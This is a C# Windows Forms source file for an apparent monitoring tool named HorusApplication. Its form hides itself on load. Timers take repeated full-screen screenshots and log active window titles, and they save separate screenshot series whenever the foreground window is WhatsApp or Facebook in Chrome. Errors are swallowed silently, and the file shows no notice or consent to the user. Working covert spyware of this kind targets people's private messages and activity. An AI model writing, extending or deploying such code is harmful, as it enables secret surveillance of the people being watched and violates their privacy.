using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;

namespace HorusApplication
{
    public partial class frmTelas : Form
    {
        Graphics Graf;
        Rectangle Rec;

        public frmTelas()
        {
            InitializeComponent();
        }
         
        public void HabilitarTimer(bool habilitar)
        {
            timer1.Enabled = habilitar;
            timer2.Enabled = habilitar;
            timer3.Enabled = habilitar;
        }

        public string previousWindow = String.Empty;

        [DllImport("user32.dll")]
        public static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        public static extern int GetWindowText(IntPtr hWnd, StringBuilder txt, int count);

        public void getWindowTitle()
        {
            if (previousWindow == getActiveWindowName()){}

            else
            {
                link.Text += getActiveWindowName() + "\r\n";
                previousWindow = getActiveWindowName();
            }
        }

        private string getActiveWindowName()
        {
            const int nChar = 256;
            IntPtr handle = IntPtr.Zero;
            StringBuilder Buff = new StringBuilder(nChar);
            handle = GetForegroundWindow();

            if (GetWindowText(handle, Buff, nChar) > 0)
            {
                return Buff.ToString();
            }
            return null;
        }

        private void Timer_Tick(object sender, EventArgs e)
        {
            getWindowTitle();
        }
        public string a = null;

        public int counter = 0;

        private void timer1_Tick(object sender, EventArgs e)
        {            
            if ((getActiveWindowName() != "WhatsApp - Google Chrome") & (getActiveWindowName() != "Facebook - Google Chrome"))
            {
                try
                {
                    counter = counter + 1;
                    Rec = new Rectangle();
                    Rec = Screen.GetBounds(Rec);

                    String[] imgs = new String[counter];

                    string a = counter.ToString();

                    Convert.ToString(counter);

                    Bitmap Foto = new Bitmap(Rec.Width, Rec.Height, System.Drawing.Imaging.PixelFormat.Format32bppArgb);
                    Graf = Graphics.FromImage(Foto);
                    Graf.CopyFromScreen(Rec.X, Rec.Y, 0, 0, Rec.Size, CopyPixelOperation.SourceCopy);

                    try
                    {
                        Foto.Save(@"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas\Telas\prints\myimg" + Convert.ToString(counter) + ".jpg");
                    }
                    catch { }
                }
                catch { }
            }
            else{}            
        }

        private void InitializeTimer()
        {
            // Run this procedure in an appropriate event.             
            // Hook up timer's tick event handler.  
            this.timer1.Tick += new System.EventHandler(this.timer1_Tick);
        }

        private void frmTelas_Load(object sender, EventArgs e)
        {
            this.Hide();            
        }

        public int wcounter = 0;

        private void timer2_Tick(object sender, EventArgs e)
        {
            if (getActiveWindowName() == "WhatsApp - Google Chrome")
            {              
                wcounter = wcounter + 1;
                Rec = new Rectangle();
                Rec = Screen.GetBounds(Rec);

                String[] imgs = new String[wcounter];

                string a = wcounter.ToString();

                Convert.ToString(counter);

                Bitmap Foto = new Bitmap(Rec.Width, Rec.Height, System.Drawing.Imaging.PixelFormat.Format32bppArgb);
                Graf = Graphics.FromImage(Foto);
                Graf.CopyFromScreen(Rec.X, Rec.Y, 0, 0, Rec.Size, CopyPixelOperation.SourceCopy);

                try
                {
                    Foto.Save(@"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas\Telas\wprints\wmyimg" + Convert.ToString(wcounter) + ".jpg");
                }
                catch{}
            }
            else{}
        }

        public int fcounter = 0;

        private void timer3_Tick(object sender, EventArgs e)
        {
            if (getActiveWindowName() == "Facebook - Google Chrome")
                {
                    fcounter = fcounter + 1;
                    Rec = new Rectangle();
                    Rec = Screen.GetBounds(Rec);

                    String[] imgs = new String[fcounter];

                    string a = fcounter.ToString();

                    Convert.ToString(fcounter);

                    Bitmap Foto = new Bitmap(Rec.Width, Rec.Height, System.Drawing.Imaging.PixelFormat.Format32bppArgb);
                    Graf = Graphics.FromImage(Foto);
                    Graf.CopyFromScreen(Rec.X, Rec.Y, 0, 0, Rec.Size, CopyPixelOperation.SourceCopy);

                    try
                    {
                        Foto.Save(@"C:\Users\" + Environment.UserName.ToString() + @"\Documents\Salvas\Telas\fprints\fmyimg" + Convert.ToString(fcounter) + ".jpg");
                    }
                    catch{}
                }
                else{}
        }

        public static int time = 1;
        private void Timer_Tick_1(object sender, EventArgs e)
        {
            
        }        
    }
}
